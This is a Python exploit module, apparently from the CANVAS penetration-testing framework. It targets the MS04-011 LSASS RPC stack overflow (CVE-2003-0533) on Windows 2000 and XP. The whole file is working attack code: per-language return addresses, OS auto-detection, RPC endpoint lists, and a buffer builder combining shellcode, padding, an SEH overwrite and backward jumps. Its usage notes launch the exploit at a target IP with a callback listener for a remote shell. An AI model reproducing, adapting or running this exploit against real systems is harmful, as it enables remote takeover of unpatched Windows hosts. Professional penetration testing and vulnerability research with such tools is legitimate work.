#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
import canvasengine
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_win2k_unistring, s_dce_raw_unistring, s_dce_unistring

# GUI info
NAME                              = 'Microsoft Windows LsaSs RPC Overflow'
DESCRIPTION                       = 'Microsoft Windows LsaSs RPC lsasrv.dll Stack Overflow'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Microsoft"
DOCUMENTATION['Date public']      = '04/13/04'
DOCUMENTATION['References']       = 'http://www.microsoft.com/technet/security/Bulletin/MS04-011.mspx'
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = ''
DOCUMENTATION["CVE Name"]         = "CVE-2003-0533"
DOCUMENTATION["CVE Url"]          = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0533"
DOCUMENTATION['CVSS']             = 7.5
VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Remote'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['2000','XP']
PROPERTY['MSADV']                 = 'MS04-011-LSASS'

CHANGELOG="""
KK 01/26/07:
Rewritten
"""

NOTES="""
Tested on:
Windows 2000 Server SP0 English OOTB
Windows 2000 Server SP4 English OOTB
Windows 2000 Professional SP0 Simplified Chinese OOTB
Windows 2000 Server SP4 Japanese OOTB
Windows 2000 Professional SP0 German OOTB
Windows 2000 Professional SP0 Spanish OOTB
Windows XP Professional SP0 English OOTB
Windows XP Professional SP1a English OOTB

Usage:
./exploits/ms04_011/ms04_011.py -v 0 -t 10.10.11.132 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

targets={
    0: ['Autoversioning',0],     
    1: ['Windows 2000 SP0-SP4 English',0x750219d6], #call ebx
    2: ['Windows 2000 SP0-SP4 French, Simplified Chinese',0x74fa19d6], #call ebx
    3: ['Windows 2000 SP0-SP4 Japanese',0x74f819d6], #call ebx
    4: ['Windows 2000 SP0-SP4 German',0x74f919d6], #call ebx
    5: ['Windows 2000 SP0-SP4 Dutch, Italian, Spanish',0x74fd19d6], #call ebx
    6: ['Windows XP SP0-SP1a',0x225028] #jmp esp
}



class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.port           = 139
        self.host           = ''
        self.version        = 0
        self.badstring      = '\x00\xff\\/.:$'
        self.UUID           = u'3919286a-b10c-11d0-9ba8-00c04fd92ef5'
        self.uuidversion    = u'0.0'
        self.targetfunction = 0x9
        self.autoversion    = 1
        self.subesp         = 3000
        self.listenerArgsDict['fromcreatethread'] =1
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
                                            
    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))

    def testOS(self):
        self.getArgs()
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        devlog('ms04_011','target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if not os.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'%(self.engine.osdetect_lang))
                os.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        self.log('version=%s'%(os.version))
        if os.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(os.language))
            langdict={'English':1,'French':2,'Simplified Chinese':2,'Japanese':3,'German':4,'Dutch':5,'Italian':5,'Spanish':5}
            if os.language in langdict.keys():
                self.version=langdict[os.language]
                return 1
            self.log('No version found: returning failed...')
            return 0
        elif os.version=='XP':
            self.log('Attacking Windows XP language: %s'%(os.language))
            self.version=6
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.getArgs()
        host=self.host
        connectionList=['ncacn_np:%s[\\lsarpc]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host,self.port),\
                        'ncacn_ip_tcp:%s[1025]'%(host),\
                        'ncacn_ip_tcp:%s[1026]'%(host),\
                        'ncacn_ip_tcp:%s[1027]'%(host),\
                        'ncacn_ip_tcp:%s[1028]'%(host)]
        #connectionList+=self.searchifids()
        connectionList=uniquelist(connectionList)
        self.connectionList=connectionList
        return self.connectionList

    def buildDcePacket(self):
        self.log('version=%d' % (self.version))
        self.description,self.eip=targets[self.version]
        data=''
        packet=''
        if self.description.count('2000')>0:
            data+='\\'
            data+=self.shellcode
            data+='A'*(0x7e4-len(data))
            data+='BBB\xff' #access violation
            data+='C'*(0xb10-len(data))            
            from MOSDEF import mosdef
            data+=mosdef.assemble('jmp $-%d'%(len(data)-1+5),'x86') #jmp backward
            data+='DDD'
            data+='\xeb\xf6' #jmp backward
            data+='EE'
            data+=struct.pack('<L',self.eip) #SEH
            packet+=s_dce_win2k_unistring(data)
        elif self.description.count('XP')>0:
            data+='\\\x00'
            data+=self.shellcode
            data+='A'*(0x7ac-len(data))
            data+=struct.pack('<L',self.eip)
            data+='B'*0xc
            from MOSDEF import mosdef
            data+=mosdef.assemble('jmp $-%d'%(len(data)-2+5),'x86') #jmp backward
            if (len(data)%2)==1:
                data+='C'
            packet+=s_dce_raw_unistring(data)
        packet+=struct.pack('<L',0)
        packet+=s_dce_unistring('')
        packet+=s_dce_unistring('')
        packet+=s_dce_unistring('')
        packet+=struct.pack('<LLLLLL',0,0,0,0,0,0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
